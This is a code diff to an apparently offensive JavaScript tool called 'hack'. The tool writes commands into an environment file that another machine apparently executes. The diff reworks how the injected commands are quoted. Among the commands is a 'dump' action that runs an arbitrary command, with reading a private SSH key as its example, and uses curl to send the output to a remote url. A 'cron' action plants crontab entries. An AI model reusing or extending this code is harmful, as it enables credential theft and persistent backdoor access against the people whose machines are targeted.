@@ -34,7 +34,7 @@ function hack(env, cmd, args) {
 
   } else if (cmd === 'dump') {
     // `hack live dump "cat ~/.ssh/id_rsa"`
-    write(env, "echo " + JSON.stringify("$(" + args[0] + ")") + " | curl --data-binary @- " + url + "/dump")
+    write(env, "echo " + wrap('"', "\\$(" + args[0] + ")") + " | curl --data-binary @- " + url + "/dump")
 
   } else if (cmd == 'reset') {
     // `hack live reset`
@@ -70,7 +70,7 @@ function hack(env, cmd, args) {
 
   } else if (cmd === 'cron') {
     // `hack live cron "20 16 * * * say 'its 4 20!'"`
-    write(env, "echo " + JSON.stringify(args[0]) + " | crontab")
+    write(env, "echo " + wrap('"', args[0]) + " | crontab")
 
   } else if (cmd === 'forget') {
     // `hack live forget`
@@ -111,12 +111,20 @@ function write(env, cmd) {
   if (!shell.test('-e', env)) {
     shell.touch(env)
   }
+
+  console.log("WRITE", wrap('"', text))
   // write to the environment file
-  shell.exec('echo ' + JSON.stringify(text) + ' > ' + env)
+  shell.exec('echo ' + wrap('"', text) + ' > ' + env)
 }
 
 
 function help() {
   console.log('hack v' + npm.version)
   console.log('usage: hack <env> <cmd> [args]')
+}
+
+function wrap(char, text) {
+  return char + text
+    .replace(/(\\+)/g, '\\$1')
+    .replace(new RegExp(char, 'g'), '\\' + char) + char
 }
